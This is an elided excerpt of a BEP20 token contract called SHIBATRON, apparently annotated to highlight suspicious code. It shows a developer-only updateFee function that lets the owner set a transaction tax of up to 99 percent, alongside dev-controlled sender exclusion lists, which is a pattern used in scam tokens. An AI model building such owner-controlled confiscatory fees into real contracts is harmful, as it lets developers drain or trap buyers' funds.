...
//Token: 0x0487fE9Ee79BB9312373AEd2901dcE58d76bD48a
//The transfering is done in the constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,address _FeeAddress,address tokenOwner) payable
...
contract SHIBATRON is Context, IBEP20, Ownable {
    ...
    function includeAccountSender(address account) external onlyDev {
        ...
        for (uint256 i = 0; i < _excludedSender.length; i++) {
            if (_excludedSender[i] == account) {
                _excludedSender[i] = _excludedSender[
                    _excludedSender.length - 1
                ];
    ...
    function updateFee(uint256 _txFee) public onlyDev {
        require(_txFee < 100);
        _TAX_FEE = _txFee * 100;
        ORIG_TAX_FEE = _TAX_FEE;
    }
